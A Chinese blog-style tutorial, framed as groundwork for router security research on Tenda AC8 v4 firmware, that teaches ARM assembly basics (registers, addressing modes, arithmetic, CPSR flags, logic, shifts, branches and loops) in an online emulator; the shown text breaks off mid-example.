# 前言
这几天我一直在对嵌入式设备进行安全研究，通过静态逆向分析，找到了许多的漏洞，但是如果不进行动态调试，这些漏洞只是一个简单的溢出漏洞而已，于是我便有了学习动态调试的想法，本文希望够为任何试图开始对路由器进行安全研究的人提供指导

本文演示用到的路由器固件下载地址：
```
https://www.tenda.com.cn/download/detail-3683.html
```
固件信息：
```
软件版本： V16.03.34.09
文件名称： AC8v4 升级软件
关联产品： AC8 v4.0
更新日期： 2023/7/24
文件大小： 6.86 M
压缩包MD5校验： 4320fb97f4dd13b66215c1100ec02637
```
虚拟机环境：Debain(kali2024)
```
# uname -a
Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux
```
下载地址：
```
https://www.kali.org/get-kali/
```
# **什么是物联网(IoT)？**
物联网（Internet of Things, IoT）这个概念最早是在1999年由英国技术专家凯文·阿什顿（Kevin Ashton）提出的。当时，他在麻省理工学院（MIT）的自动识别中心（Auto-ID Center）工作，致力于研究如何将物理对象通过互联网连接起来，从而实现更有效的供应链管理。阿什顿在一次演讲中首次使用了“物联网”这个术语，用以描述一个新的技术生态系统，其中的对象能够通过互联网互相连接和交换数据，实现智能化

物联网设备已经渗入了生活中的方方面面，家庭摄像头，智能灯泡，智能手表，智能门锁，智能电表与水表……，但是在提供便利和效率的同时，也带来了一系列的安全隐患。这些安全问题主要源于设备的广泛分布、多样性以及它们通常较弱的安全设计，如：
```
默认密码和弱密码
不安全的网络连接
缺乏及时的软件更新和补丁
跨设备攻击
……
```
虽然物联网设备带来了诸多便利，但也伴随着显著的安全风险。用户和生产商都需要采取相应的措施，以确保设备和数据的安全

为了让家里的一切都智能地工作，有一件东西几乎是不可或缺的：路由器。
我们家中路由器可以让我们连接到网络，也可以使我们连接家中的设备，无论我们距离多远。如果这些设备有公共地址，我们已经可以想象会发生什么

这些设备可能是世界上最容易在网上找到的设备，并且与其他物联网设备同样存在默认密码的问题
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711005849196-df456c00-3f10-41cc-a95f-f57143d45de3.png#averageHue=%23222222&clientId=ud8a14ec6-f2c0-4&from=paste&height=801&id=u9bab62e2&originHeight=1202&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=238670&status=done&style=none&taskId=ua46c704c-5e75-4fe9-ac2b-0bea37b64fe&title=&width=1706.6666666666667)
# ARM汇编语言基础
进行底层分析和调试研究时，需要掌握一门汇编语言才能看懂程序做了什么，ARM比较常见，各汇编语言都差不多，学会了一种，另一些大部分也可以看懂
## 介绍与寻址模式
汇编语言是计算机的低级编程语言，它是最接近机器语言的语言，arm是一种用于各种不同应用程序的编程语言，通过arm汇编语言，程序员可以在较低的层次上编程与硬件交互的代码
### ARM 编程模拟器
ARM 编程模拟器网站地址：
```
https://cpulator.01xz.net/?sys=arm-de1soc
```
进入这个网站
![](https://img-blog.csdnimg.cn/921fff241f6445b08354de0f47102b2d.png#id=j2GMu&originHeight=1047&originWidth=1365&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这个地方是显示寄存器的位置
![](https://img-blog.csdnimg.cn/274d3a6124fd42e49f6991a4c696450a.png#id=p4M51&originHeight=738&originWidth=241&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
寄存器是内存中非常靠近cpu的区域，因此可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限
这个地方显示内存里的值
![](https://img-blog.csdnimg.cn/5742ffb8eab5430e9f6a951af163f58f.png#id=e10xk&originHeight=1047&originWidth=1365&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
sp寄存器会告诉我们堆栈上下一个可以用内存的地址，现在sp里的值全是0，所以我们下一个可用的内存地址的值在这里
![](https://img-blog.csdnimg.cn/aebe4824ac4d48cb8acc6c96bbae53a9.png#id=M2QBh&originHeight=68&originWidth=228&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/607a4f764db44cf99d71489044ccdeef.png#id=I2pis&originHeight=40&originWidth=596&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
现在我选中的地址为0，在它旁边的地址为4，以此类推
![](https://img-blog.csdnimg.cn/e0f755a7f58047f4b2d995f861fff0ed.png#id=OhTit&originHeight=162&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
现在选中的这个位置为16，以此类推
![](https://img-blog.csdnimg.cn/e2ddb3f43bc74d59a83526e42bad4464.png#id=cEaRT&originHeight=70&originWidth=413&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
LR寄存器是我们的链接寄存器，如果使用过高级语言就会知道，当你有一个函数时，函数就会有一个返回值，而这个值会让我们回到调用函数的位置，这就是链接寄存器的作用
![](https://img-blog.csdnimg.cn/3d0a6dab7d4b44eb9b746b503d9c03c2.png#id=N9KD3&originHeight=104&originWidth=208&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
PC是我们的程序计数器，它的作用是跟踪要执行的下一条指令的位置
![](https://img-blog.csdnimg.cn/d8648085100944b3896fea3f12bfbef6.png#id=Yi5AP&originHeight=102&originWidth=208&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 第一个程序
在我们程序的起点，模拟器会自动放入两行开始代码，告诉程序的起点在哪，如果在模拟器之外的地方编程，需要自己手动写入
![](https://img-blog.csdnimg.cn/bf075e7f44b04101a7d3d2ab66adea82.png#id=C4Gxo&originHeight=429&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们将在_start:下面写入代码，_start:被称为标签，标签和高级语言中函数差不多，这是一种能划分代码段的方法
我们先来写一个简单的代码，代码的作用是将一些数据移动到寄存器里，然后在将一些数据移动到另一个寄存器里，我们看看数据是如何移动到寄存器里的
```
mov r0,#30                   //将30移动到寄存器0中
mov r7,#1                    //将1移动到寄存器7中
SWI 0                        //中断程序
```
然后按下f5运行代码
![](https://img-blog.csdnimg.cn/07d36fccd19d4324b7e287f9f38bc4cc.png#id=sQvQg&originHeight=867&originWidth=1296&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
现在这个界面为反汇编界面，然后按下f2，一步一步执行代码
![](https://img-blog.csdnimg.cn/36647a2f025349aca5fbdbba37851548.png#id=zKV8f&originHeight=477&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，r0寄存器里的值已经改变了，1e与十进制的30相同，
在这里可以将寄存器十六进制的值转换为十进制
![](https://img-blog.csdnimg.cn/bac0583fbcc3425f9120630fcbd9496f.png#id=kLppk&originHeight=833&originWidth=469&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/d54f4b9e38cf4aa091b623e8fc5e45f2.png#id=KJ6nE&originHeight=606&originWidth=277&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 寻址类型
寻址类型的定义是在程序的内存位置上可以通过多种方式从内存中存储和检索数据，在上面我们就运用了一种寻址类型，叫做立即寻址
```
mov r0,#30                   //将30移动到寄存器0中
mov r7,#1                    //将1移动到寄存器7中
```
取一个值，将其直接放入一个寄存器，这种类型就叫做立即寻址
我们还可以将一个寄存器里的值，放入另一个寄存器中
```
mov r1,#1     //将1放入寄存器1中
mov r2,r1    //将r1寄存器里的值放入r2寄存器中
```
我们还可以定义一个数据段在里面存放数据，之后需要调用时可以直接调用这个数据段
```
.data    //data段，用于存放数据
```
之后我们可以随意在里面定义变量
![](https://img-blog.csdnimg.cn/15b2951a278b4a8eaa6f141c84a37495.png#id=oNOSo&originHeight=211&originWidth=473&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
.global _start
_start:
	
.data
baimao:   //定义的变量名
	.word 1,2,-3,4,5,-6,7,8,-9,10   //.word：告诉程序每一个值都是word类型，大小为32位，用于存放数据
```
现在我需要调用这个变量在内存中的位置，只需要在baimao里查找第一个条目就好了，它会从第一个开始依次出现在内存中
```
.global _start
_start:
	ldr r0,=baimao     //ldr：将data段里baimao中的数据加载到r0寄存器中
.data
baimao:   //定义的变量名
	.word 1,2,-3,4,5,-6,7,8,-9,10   //.word：告诉程序每一个值都是word类型，大小为32位，用于存放数据
```
![](https://img-blog.csdnimg.cn/e0bc23d98d0749acadbf83afc323a70c.png#id=hmJYa&originHeight=243&originWidth=480&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后按f5运行，进入汇编页面
![](https://img-blog.csdnimg.cn/e5f4e6ad92c54df6a553fc14420ddfd3.png#id=SGCmv&originHeight=323&originWidth=957&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后在右下角设置位十进制显示
![](https://img-blog.csdnimg.cn/e44f688faae94a5187ea86de7fb3be36.png#id=cF3ZY&originHeight=193&originWidth=377&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
ctrl+m进入内存页面，就能以十进制显示我们的数据
![](https://img-blog.csdnimg.cn/787280cab98e47b8af0053af3f86ad16.png#id=k6hKZ&originHeight=144&originWidth=785&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们还可以用另一个寻址模式来演示一下从该位置检索值
```
.global _start
_start:
	ldr r0,=baimao     //ldr：将data段里baimao中的数据加载到r0寄存器中
	ldr r1,[r0]   //汇编程序寻找r0寄存器地址中的值，移动到r1寄存器里
.data
baimao:   //定义的变量名
	.word 1,2,-3,4,5,-6,7,8,-9,10   //.word：告诉程序每一个值都是word类型，大小为32位，用于存放数据
```
按f5汇编后，进入汇编页面
![](https://img-blog.csdnimg.cn/61fffea0ff4c4d4fac50344ca2e1d74c.png#id=UXmCe&originHeight=302&originWidth=691&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
按f2执行程序后可以看到，r0寄存器里的值为16
![](https://img-blog.csdnimg.cn/959aa611d8c845d981542fac199f26be.png#id=k3reD&originHeight=288&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
进入内存，可以发现确实存在一个16的值，后面的那个0为方括号的值
![](https://img-blog.csdnimg.cn/63d55b9c8b0e4f578190122cca19b62d.png#id=EuVhZ&originHeight=173&originWidth=712&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
继续按下f2后，r1寄存器里的值就是我们之前定义的值了
![](https://img-blog.csdnimg.cn/8a799f9dd3564c87986a1972a51b7493.png#id=mT8qL&originHeight=321&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
r0寄存器里的值就是告诉程序从哪个内存地址里获取值，这里是16，所以在内存里也看到了16，紧挨着的就是我们定义的一些值
这里我用python来演示一下，可以更好的理解
```
.global _start
_start:
	ldr r0,=baimao     //ldr：将data段里baimao中的数据加载到r0寄存器中
	ldr r1,[r0]   //汇编程序寻找r0寄存器地址中的值，移动到r1寄存器里
.data
baimao:   //定义的变量名
	.word 1,2,-3,4,5,-6,7,8,-9,10   //.word：告诉程序每一个值都是word类型，大小为32位，用于存放数据
```
```
//上面那个汇编程序

baimao = [1,2,-3,4,5,-6,7,8,-9,10]
baimao[i]    //i就相当于r0寄存器的作用
```
还有其他方法可以调用变量里的值，比如说，我只需要2以后的这些值，该怎么办呢
这里我们可以使用偏移量来达到我们想要的值
```
.global _start
_start:
	ldr r0,=baimao     //ldr：将data段里baimao中的数据加载到r0寄存器中
	ldr r1,[r0]   //汇编程序寻找r0寄存器地址中的值，移动到r1寄存器里
	ldr r2,[r0,#4]   //偏移4字节，移动到r1寄存器里
.data
baimao:   //定义的变量名
	.word 1,2,-3,4,5,-6,7,8,-9,10   //.word：告诉程序每一个值都是word类型，大小为32位，用于存放数据
```
这里我用python来演示一下，可以更好的理解
```
//上面那个汇编程序

baimao = [1,2,-3,4,5,-6,7,8,-9,10]
baimao[i+1]    //+1就相当于偏移量
```
因为在内存中下一个值的位置是四个字节，所以这里偏移4位
![](https://img-blog.csdnimg.cn/8d74f3e9987049bd851720c4d8c05d44.png#id=UqMab&originHeight=86&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
运行程序，可以看到r2寄存器里的值变成了2
![](https://img-blog.csdnimg.cn/fe70ff952b634101a8ce1dbb50760faf.png#id=IZp9r&originHeight=175&originWidth=475&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/2f47dcdb089041b8b4dfe60ece576ec3.png#id=MYhfQ&originHeight=463&originWidth=1126&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 算数指令，CPSR寄存器与逻辑运算
### 算数指令
```
add：加
sub：减
mul：乘
```
现在我们来写一个简单的小程序
![](https://img-blog.csdnimg.cn/1f9b49eb8d704925bea0d70f50ad24ca.png#id=m7OXh&originHeight=200&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
.global _start
_start:
	mov r0,#3  //r0 = 3
	mov r1,#7  //r1 = 7
	add r2,r0,r1    //r2 = r0 + r1
```
运行程序，进入汇编页面
![](https://img-blog.csdnimg.cn/1590bc9d72314eccb4a8dc2e5291dfbb.png#id=yD8R4&originHeight=331&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，寄存器里的值都是我们输入的值，0a是十六进制，十进制为10
减法和加法一样
![](https://img-blog.csdnimg.cn/d698a909eae24c3886f28a5df5e1b0f9.png#id=SpDAw&originHeight=189&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
.global _start
_start:
	mov r0,#11  //r0 = 11
	mov r1,#1  //r1 = 1
	sub r2,r0,r1    //r2 = r0 - r1
```
运行程序，进入汇编页面
![](https://img-blog.csdnimg.cn/117abb727f5f427d880c0f5be955e9ab.png#id=xzIXT&originHeight=420&originWidth=939&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
乘法也是类似的
```
.global _start
_start:
	mov r0,#5  //r0 = 5
	mov r1,#5  //r1 = 5
	mul r2,r0,r1    //r2 = r0 * r1
```
运行程序，进入汇编页面
![](https://img-blog.csdnimg.cn/a69a997be7114ec9b1ef3974b3d32b61.png#id=CWKGK&originHeight=405&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在我们运算的时候，总会遇到负数，我们看看在arm里是怎么样的
```
.global _start
_start:
	mov r0,#1  //r0 = 1
	mov r1,#6  //r1 = 6
	sub r2,r0,r1    //r2 = r0 - r1
```
运行程序，进入汇编页面
![](https://img-blog.csdnimg.cn/b28988bc89da4705ad845f82cfe60089.png#id=rILYe&originHeight=328&originWidth=930&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
r2寄存器里的值为一个很大的数，fffffffb，将十六进制转换为十进制时可以发现为-5
![](https://img-blog.csdnimg.cn/597c5328f8a741628c1105b26d5514f4.png#id=eZ0jL&originHeight=312&originWidth=803&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### CPSR寄存器
解决负数的方法就是使用的cpsr寄存器
![](https://img-blog.csdnimg.cn/7732576b44a943d2b63e5ed43c692888.png#id=FhrvH&originHeight=189&originWidth=558&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在这里有一些字母，NZCVI SVC，这些字母都是cpsr寄存器里的特定标志
```
N：负数或小于
Z：零
C：进位或借位扩展
V：溢出
```
在这里，N代表负数，我们还可以用一些特别的指令来操作cpsr寄存器
```
.global _start
_start:
	mov r0,#1
	mov r1,#6
	subs r2,r0,r1  //当你不知道结果是否为负数时，可以在后面加S，这样就可以减少程序的报错
```
![](https://img-blog.csdnimg.cn/b6baa6e59301442fa4e4dcbe0138d52b.png#id=nkjrE&originHeight=176&originWidth=374&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
运行程序，进入汇编页面
![](https://img-blog.csdnimg.cn/a8756abef8714e86886ac34bc74ccad1.png#id=pnrZQ&originHeight=344&originWidth=876&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
当我们相加的结果超过了寄存器能存放的大小该怎么办，这时候还是要用CPSR寄存器里的特定标志
```
.global _start
_start:
	mov r0,#0xFFFFFFFF   //-1
	mov r1,#1
	adds r2,r0,r1  //因为相加后的结果超过了32位，就导致溢出了，设置s，之后cpsr寄存器就会进位
```
![](https://img-blog.csdnimg.cn/095bd99584fe45718fa972be2f202fe9.png#id=jYJsd&originHeight=344&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 逻辑运算
逻辑运算包括and，or，xor
在汇编里的表示如下：
```
and = and
or = orr
xor = eor
```
and:
```
.global _start
_start:
	mov r0,#0xff
	mov r1,#22
	and r2,r0,r1
```
![](https://img-blog.csdnimg.cn/7d5795b8f3f14661a1f587c00ee37c71.png#id=C4yxN&originHeight=373&originWidth=987&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
or则相反：
```
.global _start
_start:
	mov r0,#0xff
	mov r1,#22
	orr r2,r0,r1
```
![](https://img-blog.csdnimg.cn/47f68c7813664699866a48d3666a1157.png#id=U4rAo&originHeight=345&originWidth=858&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
xor：
```
.global _start
_start:
	mov r0,#2
	mov r1,#3
	eor r2,r0,r1   //将r0与r1里的值进行异或运算，输出结果到r2寄存器里
```
![](https://img-blog.csdnimg.cn/d53d5ead7df0441fa1c24ac31b5efa2b.png#id=n24tE&originHeight=321&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
还有一个特殊的指令是mvn，作用是对正数+1求反
```
.global _start
_start:
	mov r0,#2
	mvn r0,r0
```
![](https://img-blog.csdnimg.cn/50d1cf2744054c8bbf36f43eee4fb16f.png#id=wClKV&originHeight=319&originWidth=862&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
r0变成了fffffffd，转换成十进制就是-3，and指令还有一个用
```
.global _start
_start:
	mov r0,#0xff
	mvn r0,r0
	ands r0,r0,#0x000000ff
```
在执行了mov指令后，r0寄存器里的值为0xff
![](https://img-blog.csdnimg.cn/4c1653caaf3142b9ba9874f7c63b761c.png#id=MPJpt&originHeight=393&originWidth=981&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
执行了mvn指令后，r0寄存器里的值为0xffffff00
![](https://img-blog.csdnimg.cn/d9742b6840f44763900b7746238d2161.png#id=q3kNJ&originHeight=361&originWidth=939&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
进行了and指令后，r0寄存器为0
![](https://img-blog.csdnimg.cn/bc344e81ed9442ea8a6489a92cc5ce1d.png#id=hDCSD&originHeight=338&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 逻辑移位和轮换，条件与分支
### 逻辑移位
```
LSL：逻辑左移
LSR：逻辑右移
```
这里有一个二进制00001010，转换为十进制为10，现在要进行LSL逻辑左移
```
00001010 --- 00010100  //每一位都向前移一位
```
现在就变成了00010100，十进制为20，就相当于乘以二了，我们可以用逻辑左移的方式，对数值乘以二
现在我们要进行LSR逻辑右移，还是二进制00001010，转换为十进制为10
```
00001010 --- 00000101   //每一位都向后移一位
```
现在就变成了00000101，转换为十进制为5，就相当于对数值除以二了
实战：
```
.global _start
_start:
	mov r0,#10
	lsl r0,#1  //lsl指令后面是需要移动的寄存器，和移动的位数
```
![](https://img-blog.csdnimg.cn/bd96ef62e1134b8ba744cd5b05059fec.png#id=jtUzs&originHeight=160&originWidth=336&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
本来r0寄存器里面的值是10，现在二进制整体向左移了一位，就变成了20
![](https://img-blog.csdnimg.cn/fc1b697bbb204cb48f84377ee3b9b331.png#id=QlP2v&originHeight=320&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
实战：
```
.global _start
_start:
	mov r0,#10
	lsr r0,#1   //lsr指令后面是需要移动的寄存器，和移动的位数
```
本来r0寄存器里面的值是10，现在二进制整体向右移了一位，就变成了5
![](https://img-blog.csdnimg.cn/51f4297a79224c6aacca95f95fb42ce6.png#id=xbAXh&originHeight=320&originWidth=939&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 轮换
```
ROR：右移轮换
```
轮换和逻辑移位很相似，但移位的时候不会损失数值
```
LSR：00001001 --- 00000100  //最后的1被移除了
ROR：00001001 --- 10000100  //1去到最左边了
```
需要注意的是，只有ROR，没有ROL，只能向右移，不能向左移
```
.global _start
_start:
	mov r0,#100
	ror r0,#1  //ror指令后面是需要移动的寄存器，和移动的位数
```
![](https://img-blog.csdnimg.cn/d917c2f54e46462f9837c20d1b8f00c1.png#id=NoF0i&originHeight=324&originWidth=939&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### 条件和分支
在高级语言里有if判断，在arm里也有if判断的指令
```
cmp：对操作的两个寄存器相减，不同的话就为正数或负数，相同就为0
bgt：b的意思是分支，gt的意思是大于
bge：大于等于
blt：小于
ble：小于等于
beq：等于
bne：不等于
```
```
.global _start
_start:
	mov r0,#2
	mov r1,#1
	cmp r0,r1   //r0 - r1
	bgt baimao  //当r0大于r1时，执行baimao标签里的内容
	
baimao:   
	mov r2,#5
```
在这里判断是正确的，r0大于r1时，他会直接跳到指定的标签里执行内容
![](https://img-blog.csdnimg.cn/9a3f01226b7e4bd7af3e342577846615.png#id=Omn8x&originHeight=359&originWidth=1049&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/79d2aa7ed4bb4f73b38ede05d7f0999a.png#id=pTikI&originHeight=394&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
以此类推
还有一个指令是可以不用判断，直接执行标签里的内容
```
bal：执行指定标签里的内容
```
```
.global _start
_start:
	mov r0,#2
	mov r1,#1
	bal baimao
	
baimao:
	mov r2,#5
```
![](https://img-blog.csdnimg.cn/9f765e5e23914cb0911a606fb911835b.png#id=LQKBA&originHeight=359&originWidth=933&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 带有分支的循环和条件指令执行
在arm里也有和高级语言一样的for和while循环，可以根据条件来判断是否执行
### 带有分支的循环
首先我们创建一个data标签，然后在里面写一个分支，存放一些数值，然后使这些存放的数值依次相加
```
.global _start
_start:
	
.data   //data段，用于存放数据
list:   //定义的变量名
	.word 1,2,3,4,5,6,7,8,9,10  //.word：告诉程序每一个值都是word类型，大小为32位，用于存放数据
```
![](https://img-blog.csdnimg.cn/c64dd45572664e698612c571061dc7fd.png#id=FADOl&originHeight=195&originWidth=337&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后我们要将list加载到内存里
```
.global _start
_start:
	ldr r0,=list  //ldr：将data段里list中的数据加载到r0寄存器中
	 
.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
然后使用直接寻址，将r0寄存器里的值放到r1寄存器里
```
.global _start
_start:
	ldr r0,=list
	ldr r1,[r0]   //汇编程序寻找r0寄存器地址中的值，移动到r1寄存器里
	
.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
然后我们可以使用加法，将第一个值添加到r2寄存器里
```
.global _start
_start:
	ldr r0,=list
	ldr r1,[r0]   
	add r2,r2,r1  //r2 = r2 + r1 
	
.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
![](https://img-blog.csdnimg.cn/bb321267f94c45888f90787af9e6e7cb.png#id=i2dEf&originHeight=276&originWidth=461&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
现在按f5执行程序，看看内存里是什么样子的
![](https://img-blog.csdnimg.cn/4b5663e9b2cc4e009ec83808f2d8786e.png#id=nMeuA&originHeight=156&originWidth=501&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
存放的都是list里的值，1-10，之后就都是aaaaaaaa，aaaaaaaa的意思是内存中空闲的位置，我们可以利用这个aaaaaaaa，使遍历列表的时候告诉程序这就是列表的末尾了

我们可以将aaaaaaaa存放到某个变量里，但是在arm里，存放的值只能是特定大小，大小为两个十六进制值，明显aaaaaaaa大于了两个十六进制，这里我们就要使用常量了

常量很简单，在程序顶端输入.equ就可以定义了，我们可以给他一个名称和值，这和高级语言中定义常量的方法相同
```
.global _start
.equ endlist,0xaaaaaaaa   //定义一个常量，名称为endlist，内容为0xaaaaaaaa
_start:
	ldr r0,=list
	ldr r1,[r0]   
	add r2,r2,r1
	
	
.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
![](https://img-blog.csdnimg.cn/888b8e90d25249e7a63fa27d12211c8b.png#id=SYR1u&originHeight=278&originWidth=424&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后可以使用ldr将其加载到内存中
```
.global _start
.equ endlist,0xaaaaaaaa
_start:
	ldr r0,=list
	ldr r3,=endlist   //加载到r3寄存器中，之后写循环时方便利用
	ldr r1,[r0]   
	add r2,r2,r1
	
.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
![](https://img-blog.csdnimg.cn/b670cb3dce91419fba64ed64a36f410d.png#id=GyTrx&originHeight=285&originWidth=403&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
之后我们就可以开始写循环了，首先创建一个loop标签，加载list里的值
```
.global _start
.equ endlist,0xaaaaaaaa
_start:
	ldr r0,=list
	ldr r3,=endlist
	ldr r1,[r0]   
	add r2,r2,r1
loop:
	ldr r1,[r0,#4]!   //r0寄存器里的值偏移4字节，移动到r1寄存器里，然后他会查看内存中的那个位置是否是空的，之后将值存放在这里

.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
![](https://img-blog.csdnimg.cn/cb9a6f66fe01413fab51d56e687cca13.png#id=r29Nj&originHeight=345&originWidth=482&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后我们比较两个r1,r3，如果他们相等，我们就离开循环
```
.global _start
.equ endlist,0xaaaaaaaa
_start:
	ldr r0,=list
	ldr r3,=endlist
	ldr r1,[r0]   
	add r2,r2,r1
loop:
	ldr r1,[r0,#4]!
	cmp r1,r3   //比较这两个寄存器
	beq exit   //小于等于则调用exit标签
	
.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
然后创建一个exit标签，不用写内容，他的作用就是程序的出口点
```
.global _start
.equ endlist,0xaaaaaaaa
_start:
	ldr r0,=list
	ldr r3,=endlist
	ldr r1,[r0]   
	add r2,r2,r1
loop:
	ldr r1,[r0,#4]!
	cmp r1,r3
	beq exit
	
exit:  //exit标签

.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
![](https://img-blog.csdnimg.cn/0dbfdef7c04842b1a24ffa185139ff37.png#id=OBwbJ&originHeight=377&originWidth=472&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
如果我们还没达到list的末尾，我们可以添加值到r2寄存器里，然后再次循环直到到达末尾
```
.global _start
.equ endlist,0xaaaaaaaa
_start:
	ldr r0,=list
	ldr r3,=endlist
	ldr r1,[r0]   
	add r2,r2,r1
loop:
	ldr r1,[r0,#4]!
	cmp r1,r3
	beq exit
	add r2,r2,r1  // //r2 = r2 + r1 
	bal loop  //然后通过跳转指令建立一个无限循环，直到r1和r3相等，到达list末尾
exit:

.data
list:
	.word 1,2,3,4,5,6,7,8,9,10
```
这就是一个完整的循环，作用是遍历list，使里面的值依此相加
之后运行程序
![](https://img-blog.csdnimg.cn/d072507d3283402d83cbaa583521b762.png#id=OzM4y&originHeight=701&originWidth=1236&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后进入循环，在循环10次后退出程序
![](https://img-blog.csdnimg.cn/4d8c25418e354198b2e7877a5a139303.png#id=aMkCy&originHeight=628&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/9cf393b4c8e644feb32a80c8de9863a3.png#id=GnXuh&originHeight=284&originWidth=322&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
1到10相加就等于55
### 条件指令执行
条件指令可以根据运算结果更新的条件标志，来判断指令的条件码是否符合条件，符合条件就执行，不符合条件则不执行
现在我们随便在寄存器里放一些值，然后比较
```
.global _start
_start:
	mov r0,#2
	mov r1,#4
	cmp r0,r1
```
![](https://img-blog.csdnimg.cn/c459c77ec54249a5bc380c1e7189106f.png#id=Nkk9k&originHeight=212&originWidth=343&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
如果r0小于r1，就在r2寄存器里放入一个值
```
.global _start
_start:
	mov r0,#2
	mov r1,#4
	cmp r0,r1
	blt addr2   //如果r0小于r1，就调用addr2标签

addr2:
	add r2,#1  //r2+1
```
然后设置一个退出程序的出口
```
.global _start
_start:
	mov r0,#2
	mov r1,#4
	cmp r0,r1
	blt addr2
	bal exit  //跳转到exit标签里

addr2:
	add r2,#1
	
exit:
```
![](https://img-blog.csdnimg.cn/375634c6a03f49ab802f91f62f7d84e3.png#id=E1BLl&originHeight=294&originWidth=403&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
仅仅实现这么简单的一个功能，需要的代码也太多了，有没有其他方法呢，我们可以使用条件指令来少写一些代码
还是随便在寄存器里放一些值然后比较
```
.global _start
_start:
	mov r0,#2
	mov r1,#4
